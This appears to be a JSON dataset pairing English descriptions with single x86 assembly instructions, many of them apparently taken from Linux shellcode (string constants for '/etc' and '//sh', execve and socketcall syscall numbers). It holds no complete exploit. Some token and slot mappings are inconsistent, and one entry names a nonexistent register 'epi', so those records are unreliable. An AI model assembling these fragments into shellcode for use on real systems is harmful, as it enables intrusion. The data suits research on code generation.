    "snippet": "mov dword [esp-12], 0x6374652f",
    "slot_map": {
      "esp-12": "var2",
      "0x6374652f": "var0",
      "[": "var1",
      "]": "var3"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dword",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move 0x6374652f into the dword at the memory location [esp-12]",
    "rewritten_intent": "move 0x6374652f into the dword at the memory location [esp-12]",
    "snippet": "mov dword [esp-12], 0x6374652f",
    "slot_map": {
      "esp-12": "var2",
      "0x6374652f": "var0",
      "[": "var1",
      "]": "var3"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dword",
      "memory",
      "location",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "4"
    ]
  },
  {
    "intent": "move ecx into the doubleword starting at the address esp-4",
    "rewritten_intent": "move ecx into the doubleword starting at the address esp-4",
    "snippet": "mov dword [esp-4], ecx",
    "slot_map": {
      "esp-4": "var1",
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "doubleword",
      "starting",
      "address",
      "esp-4"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move esi into the dword at address [esp-4]",
    "rewritten_intent": "move esi into the dword at address [esp-4]",
    "snippet": "mov dword [esp-4], esi",
    "slot_map": {
      "esp-4": "var2",
      "esi": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dword",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the esi register into the dword at the memory location [esp-4]",
    "rewritten_intent": "move the contents of the esi register into the dword at the memory location [esp-4]",
    "snippet": "mov dword [esp-4], esi",
    "slot_map": {
      "esp-4": "var2",
      "esi": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "dword",
      "memory",
      "location",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move esi into the doubleword starting at the address esp-4",
    "rewritten_intent": "move esi into the doubleword starting at the address esp-4",
    "snippet": "mov dword [esp-4], esi",
    "slot_map": {
      "esp-4": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "doubleword",
      "starting",
      "address",
      "esp-4"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x68732f2f into the dword at address [esp-8]",
    "rewritten_intent": "move 0x68732f2f into the dword at address [esp-8]",
    "snippet": "mov dword [esp-8], 0x68732f2f",
    "slot_map": {
      "esp-8": "var2",
      "0x68732f2f": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dword",
      "address",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x68732f2f into the dword at the memory location [esp-8]",
    "rewritten_intent": "move 0x68732f2f into the dword at the memory location [esp-8]",
    "snippet": "mov dword [esp-8], 0x68732f2f",
    "slot_map": {
      "esp-8": "var2",
      "0x68732f2f": "var0",
      "[": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "dword",
      "memory",
      "location",
      "[",
      "var2",
      "]"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move edi into the doubleword starting at the address esp-8",
    "rewritten_intent": "move edi into the doubleword starting at the address esp-8",
    "snippet": "mov dword [esp-8], edi",
    "slot_map": {
      "esp-8": "var1",
      "edi": "var0"
    },
    "intent_tokens": [
      "move",
      "var0",
      "doubleword",
      "starting",
      "address",
      "esp-8"
    ],
    "snippet_tokens": [
      "mov",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x1a4 into dx",
    "rewritten_intent": "move 0x1a4 into dx",
    "snippet": "mov dx, 0x1a4",
    "slot_map": {
      "0x1a4": "var0",
      "dx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0x2a1 into the dx register",
    "rewritten_intent": "move the value 0x2a1 into the dx register",
    "snippet": "mov dx, 0x2a1",
    "slot_map": {
      "0x2a1": "var0",
      "dx": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xb01 into dx",
    "rewritten_intent": "move 0xb01 into dx",
    "snippet": "mov dx, 0xb01",
    "slot_map": {
      "0xb01": "var0",
      "dx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 1222 into dx",
    "rewritten_intent": "move 1222 into dx",
    "snippet": "mov dx, 1222",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "move",
      "1222",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "1222"
    ]
  },
  {
    "intent": "move 132 into dx",
    "rewritten_intent": "move 132 into dx",
    "snippet": "mov dx, 132",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "move",
      "132",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "132"
    ]
  },
  {
    "intent": "move 16666 into dx",
    "rewritten_intent": "move 16666 into dx",
    "snippet": "mov dx, 16666",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "move",
      "16666",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "16666"
    ]
  },
  {
    "intent": "move _start into eax",
    "rewritten_intent": "move _start into eax",
    "snippet": "mov eax, _start",
    "slot_map": {
      "_start": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move value of memory address [ebp+8] into eax",
    "rewritten_intent": "move value of memory address [ebp+8] into eax",
    "snippet": "mov eax, [ebp+8]",
    "slot_map": {
      "ebp+8": "var1",
      "[": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "move",
      "value",
      "memory",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the 4 bytes in memory at the address contained in ebx into eax",
    "rewritten_intent": "move the 4 bytes in memory at the address contained in ebx into eax",
    "snippet": "mov eax, [ebx]",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "4",
      "bytes",
      "memory",
      "address",
      "contained",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register",
    "rewritten_intent": "copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register",
    "snippet": "mov eax, [ebx+8]",
    "slot_map": {
      "ebx+8": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "copy",
      "4",
      "byte",
      "memory",
      "location",
      "specified",
      "the",
      "result",
      "operation",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents of memory address ebx+epi*4+2 into eax",
    "rewritten_intent": "move the contents of memory address ebx+epi*4+2 into eax",
    "snippet": "mov eax, [ebx+epi*4+2]",
    "slot_map": {
      "ebx+epi*4+2": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents of memory address ebx+esi into eax",
    "rewritten_intent": "move the contents of memory address ebx+esi into eax",
    "snippet": "mov eax, [ebx+esi]",
    "slot_map": {
      "ebx+esi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents of memory address ebx+esi*2+4 into eax",
    "rewritten_intent": "move the contents of memory address ebx+esi*2+4 into eax",
    "snippet": "mov eax, [ebx+esi*2+4]",
    "slot_map": {
      "ebx+esi*2+4": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move 4 bytes at memory address esi-4 into eax",
    "rewritten_intent": "move 4 bytes at memory address esi-4 into eax",
    "snippet": "mov eax, [esi-4]",
    "slot_map": {
      "esi-4": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "4",
      "bytes",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents of memory address esp into eax",
    "rewritten_intent": "move the contents of memory address esp into eax",
    "snippet": "mov eax, [esp]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "esp",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "move the value of register at address esp+4 and store into eax",
    "rewritten_intent": "move the value of register at address esp+4 and store into eax",
    "snippet": "mov eax, [esp+4]",
    "slot_map": {
      "esp+4": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "register",
      "address",
      "var0",
      "and",
      "store",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory specified by temp into eax",
    "rewritten_intent": "move the contents at memory specified by temp into eax",
    "snippet": "mov eax, [temp]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "specified",
      "temp",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "temp",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address temp1 to eax",
    "rewritten_intent": "move the contents at memory address temp1 to eax",
    "snippet": "mov eax, [temp1]",
    "slot_map": {
      "temp1": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory specified by x to eax",
    "rewritten_intent": "move the contents at memory specified by x to eax",
    "snippet": "mov eax, [x]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "specified",
      "x",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "x",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address y to eax",
    "rewritten_intent": "move the contents at memory address y to eax",
    "snippet": "mov eax, [y]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "y",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "y",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory specified by y to eax",
    "rewritten_intent": "move the contents at memory specified by y to eax",
    "snippet": "mov eax, [y]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "specified",
      "y",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "y",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory specified by z to eax",
    "rewritten_intent": "move the contents at memory specified by z to eax",
    "snippet": "mov eax, [z]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "specified",
      "z",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "z",
      "]"
    ]
  },
  {
    "intent": "move 0ah into eax",
    "rewritten_intent": "move 0ah into eax",
    "snippet": "mov eax, 0ah",
    "slot_map": {
      "0ah": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move an ascii linefeed character into eax",
    "rewritten_intent": "move an ascii linefeed character into eax",
    "snippet": "mov eax, 0ah",
    "slot_map": {
      "linefeed": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "ascii",
      "var0",
      "character",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "0ah"
    ]
  },
  {
    "intent": "move linefeed character into eax",
    "rewritten_intent": "move linefeed character into eax",
    "snippet": "mov eax, 0ah",
    "slot_map": {
      "linefeed": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "character",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "0ah"
    ]
  },
  {
    "intent": "move 0x2e323931 into eax",
    "rewritten_intent": "move 0x2e323931 into eax",
    "snippet": "mov eax, 0x2e323931",
    "slot_map": {
      "0x2e323931": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2e383631 into eax",
    "rewritten_intent": "move 0x2e383631 into eax",
    "snippet": "mov eax, 0x2e383631",
    "slot_map": {
      "0x2e383631": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2f3e20 into eax",
    "rewritten_intent": "move 0x2f3e20 into eax",
    "snippet": "mov eax, 0x2f3e20",
    "slot_map": {
      "0x2f3e20": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x2f766564 into eax",
    "rewritten_intent": "move 0x2f766564 into eax",
    "snippet": "mov eax, 0x2f766564",
    "slot_map": {
      "0x2f766564": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x31263e32 into eax",
    "rewritten_intent": "move 0x31263e32 into eax",
    "snippet": "mov eax, 0x31263e32",
    "slot_map": {
      "0x31263e32": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x33392e31 into eax",
    "rewritten_intent": "move 0x33392e31 into eax",
    "snippet": "mov eax, 0x33392e31",
    "slot_map": {
      "0x33392e31": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x3f into eax",
    "rewritten_intent": "move 0x3f into eax",
    "snippet": "mov eax, 0x3f",
    "slot_map": {
      "0x3f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 5 into eax",
    "rewritten_intent": "move 5 into eax",
    "snippet": "mov eax, 0x5",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "5",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "0x5"
    ]
  },
  {
    "intent": "move 0x50905090 into eax",
    "rewritten_intent": "move 0x50905090 into eax",
    "snippet": "mov eax, 0x50905090",
    "slot_map": {
      "0x50905090": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x563ed8b7 into eax",
    "rewritten_intent": "move 0x563ed8b7 into eax",
    "snippet": "mov eax, 0x563ed8b7",
    "slot_map": {
      "0x563ed8b7": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x66 into eax",
    "rewritten_intent": "move 0x66 into eax",
    "snippet": "mov eax, 0x66",
    "slot_map": {
      "0x66": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x6c6c756e into eax",
    "rewritten_intent": "move 0x6c6c756e into eax",
    "snippet": "mov eax, 0x6c6c756e",
    "slot_map": {
      "0x6c6c756e": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x782f2f into eax",
    "rewritten_intent": "move 0x782f2f into eax",
    "snippet": "mov eax, 0x782f2f",
    "slot_map": {
      "0x782f2f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the 32-bit value 0x8000 into register eax",
    "rewritten_intent": "move the 32-bit value 0x8000 into register eax",
    "snippet": "mov eax, 0x8000",
    "slot_map": {
      "32-bit": "var0",
      "0x8000": "var1",
      "eax": "var3"
    },
    "intent_tokens": [
      "move",
      "var0",
      "value",
      "var1",
      "register",
      "var3"
    ],
    "snippet_tokens": [
      "mov",
      "var3",
      ",",
      "var1"
    ]
  },
  {
    "intent": "move 0x8b90909d into eax",
    "rewritten_intent": "move 0x8b90909d into eax",
    "snippet": "mov eax, 0x8b90909d",
    "slot_map": {
      "0x8b90909d": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x969d8cd0 into eax",
    "rewritten_intent": "move 0x969d8cd0 into eax",
    "snippet": "mov eax, 0x969d8cd0",
    "slot_map": {
      "0x969d8cd0": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x9a8dd091 into eax",
    "rewritten_intent": "move 0x9a8dd091 into eax",
    "snippet": "mov eax, 0x9a8dd091",
    "slot_map": {
      "0x9a8dd091": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xb33fb33f into eax",
    "rewritten_intent": "move 0xb33fb33f into eax",
    "snippet": "mov eax, 0xb33fb33f",
    "slot_map": {
      "0xb33fb33f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xdeadc0de into eax",
    "rewritten_intent": "move 0xdeadc0de into eax",
    "snippet": "mov eax, 0xdeadc0de",
    "slot_map": {
      "0xdeadc0de": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xfeffff80 into eax",
    "rewritten_intent": "move 0xfeffff80 into eax",
    "snippet": "mov eax, 0xfeffff80",
    "slot_map": {
      "0xfeffff80": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0xffffffff into eax",
    "rewritten_intent": "move 0xffffffff into eax",
    "snippet": "mov eax, 0xffffffff",
    "slot_map": {
      "0xffffffff": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "code for exit syscall",
    "rewritten_intent": "code for exit syscall",
    "snippet": "mov eax, 1",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "code",
      "var0",
      "exit",
      "syscall"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "exit",
    "rewritten_intent": "exit",
    "snippet": "mov eax, 1",
    "slot_map": {},
    "intent_tokens": [
      "exit"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "invoke sys_exit",
    "rewritten_intent": "invoke sys_exit",
    "snippet": "mov eax, 1",
    "slot_map": {
      "sys_exit": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "make the system call exit",
    "rewritten_intent": "make the system call exit",
    "snippet": "mov eax, 1",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "exit"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "make the system call for exit",
    "rewritten_intent": "make the system call for exit",
    "snippet": "mov eax, 1",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0",
      "exit"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "make the system call to terminate the process",
    "rewritten_intent": "make the system call to terminate the process",
    "snippet": "mov eax, 1",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "terminate",
      "process"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "move 1 into eax",
    "rewritten_intent": "move 1 into eax",
    "snippet": "mov eax, 1",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "1",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "move the value one into eax",
    "rewritten_intent": "move the value one into eax",
    "snippet": "mov eax, 1",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "one",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "specify exit syscall",
    "rewritten_intent": "specify exit syscall",
    "snippet": "mov eax, 1",
    "slot_map": {},
    "intent_tokens": [
      "specify",
      "exit",
      "syscall"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "system call exit",
    "rewritten_intent": "system call exit",
    "snippet": "mov eax, 1",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "exit"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "terminate the process",
    "rewritten_intent": "terminate the process",
    "snippet": "mov eax, 1",
    "slot_map": {},
    "intent_tokens": [
      "terminate",
      "process"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "1"
    ]
  },
  {
    "intent": "invoke sys_unlink",
    "rewritten_intent": "invoke sys_unlink",
    "snippet": "mov eax, 10",
    "slot_map": {
      "sys_unlink": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "10"
    ]
  },
  {
    "intent": "move 10 into eax",
    "rewritten_intent": "move 10 into eax",
    "snippet": "mov eax, 10",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "10",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "10"
    ]
  },
  {
    "intent": "move 10000h into eax register",
    "rewritten_intent": "move 10000h into eax register",
    "snippet": "mov eax, 10000h",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "10000h",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "10000h"
    ]
  },
  {
    "intent": "invoke sys_socketcall",
    "rewritten_intent": "invoke sys_socketcall",
    "snippet": "mov eax, 102",
    "slot_map": {
      "sys_socketcall": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "102"
    ]
  },
  {
    "intent": "get information about the file",
    "rewritten_intent": "get information about the file",
    "snippet": "mov eax, 106",
    "slot_map": {},
    "intent_tokens": [
      "get",
      "information",
      "about",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "106"
    ]
  },
  {
    "intent": "make the system call stat",
    "rewritten_intent": "make the system call stat",
    "snippet": "mov eax, 106",
    "slot_map": {
      "stat": "var0"
    },
    "intent_tokens": [
      "make",
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "106"
    ]
  },
  {
    "intent": "make the system call to get information about the file",
    "rewritten_intent": "make the system call to get information about the file",
    "snippet": "mov eax, 106",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "get",
      "information",
      "about",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "106"
    ]
  },
  {
    "intent": "stat",
    "rewritten_intent": "stat",
    "snippet": "mov eax, 106",
    "slot_map": {
      "stat": "var0"
    },
    "intent_tokens": [
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "106"
    ]
  },
  {
    "intent": "system call stat",
    "rewritten_intent": "system call stat",
    "snippet": "mov eax, 106",
    "slot_map": {
      "stat": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "106"
    ]
  },
  {
    "intent": "execve",
    "rewritten_intent": "execve",
    "snippet": "mov eax, 11",
    "slot_map": {},
    "intent_tokens": [
      "execve"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "11"
    ]
  },
  {
    "intent": "invoke sys_execve",
    "rewritten_intent": "invoke sys_execve",
    "snippet": "mov eax, 11",
    "slot_map": {
      "sys_execve": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "11"
    ]
  },
  {
    "intent": "load and run the program",
    "rewritten_intent": "load and run the program",
    "snippet": "mov eax, 11",
    "slot_map": {},
    "intent_tokens": [
      "load",
      "and",
      "run",
      "program"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "11"
    ]
  },
  {
    "intent": "make the system call execve",
    "rewritten_intent": "make the system call execve",
    "snippet": "mov eax, 11",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "execve"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "11"
    ]
  },
  {
    "intent": "make the system to load and run the program",
    "rewritten_intent": "make the system to load and run the program",
    "snippet": "mov eax, 11",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "load",
      "and",
      "run",
      "program"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "11"
    ]
  },
  {
    "intent": "system call execve",
    "rewritten_intent": "system call execve",
    "snippet": "mov eax, 11",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "execve"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "11"
    ]
  },
  {
    "intent": "invoke sys_time",
    "rewritten_intent": "invoke sys_time",
    "snippet": "mov eax, 13",
    "slot_map": {
      "sys_time": "var0"
    },
    "intent_tokens": [
      "invoke",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "13"
    ]
  },
  {
    "intent": "move 132 to eax 132",
    "rewritten_intent": "move 132 to eax 132",
    "snippet": "mov eax, 132",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "132",
      "var0",
      "132"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "132"
    ]
  },
  {
    "intent": "go to file offset",
    "rewritten_intent": "go to file offset",
    "snippet": "mov eax, 19",
    "slot_map": {},
    "intent_tokens": [
      "go",
      "file",
      "offset"
    ],
    "snippet_tokens": [
      "mov",
      "eax",
      ",",
      "19"
